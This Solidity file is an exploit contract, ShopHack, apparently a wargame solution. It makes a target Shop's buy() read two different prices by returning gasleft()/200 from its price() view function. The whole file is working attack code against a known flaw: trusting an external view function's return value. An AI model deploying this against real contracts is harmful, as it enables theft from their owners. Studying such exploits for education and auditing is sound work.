// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface Buyer {

  function price() external view returns (uint);
}

interface Shop {

  function buy() external;
}

contract ShopHack is Buyer {

    Shop private target;

    constructor(address _target) {
        
        target = Shop(_target);
    }

    function price() external view returns (uint) {
        
        return gasleft() / 200;
    }

    function attack() public {

        target.buy();
    }

}